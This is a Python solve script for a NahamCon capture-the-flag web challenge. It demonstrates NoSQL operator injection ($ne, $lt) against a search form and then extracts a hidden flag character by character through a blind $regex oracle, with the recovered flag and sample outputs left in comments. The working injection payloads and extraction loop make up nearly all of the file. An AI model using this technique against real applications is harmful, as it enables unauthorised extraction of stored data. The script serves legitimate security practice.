import requests
from lxml import etree
import re

url = "http://challenge.nahamcon.com:32479/search"


def search(query, collection):
    resp = requests.post(url, data={
        "query": query,
        "collection": collection,
    })
    tree = etree.HTML(resp.text)
    result_elem = tree.xpath("/html/body/div/div[2]")
    result = result_elem[0].xpath("string(.)")
    result = re.sub(r"\s+", " ", result).strip()
    return result


# print(search('Inception', "movies"))
# # title: Inception year: 2010 director: Christopher Nolan rating: 8.8

# print(search('{"title":"Inception"}', "movies"))
# # title: Inception year: 2010 director: Christopher Nolan rating: 8.8

# print(search('{"title":{"$ne":"x"}}', "movies"))
# # title: The Shawshank Redemption year: 1994 director: Frank Darabont rating: 9.3 title: Pulp Fiction year: 1994 director: Quentin Tarantino rating: 8.9 title: Inception year: 2010 director: Christopher Nolan rating: 8.8 title: The Truman Show year: 1998 director: Peter Weir rating: 8.1 title: E.T. the Extra-Terrestrial year: 1982 director: Steven Spielberg rating: 7.8

# print(search('{"year":{"$lt":1990}}', "movies"))
# # title: E.T. the Extra-Terrestrial year: 1982 director: Steven Spielberg rating: 7.8

# print(search("??? $regex", "flags"))
# Error Invalid query format. Use 'flag: {$regex: pattern}'


print(search("flag: {$regex: (.*?)}", "flags"))
# result: Pattern matched

flag = "flag{"
for i in range(32):
    for ch in "0123456789abcdef":
        result = search("flag: {$regex: " + flag + ch + "(.*?)}", "flags")
        if "Pattern matched" in result:
            flag += ch
            print(flag)
            break

# flag{4cb8649d9ecb0ec59d1784263602e686}
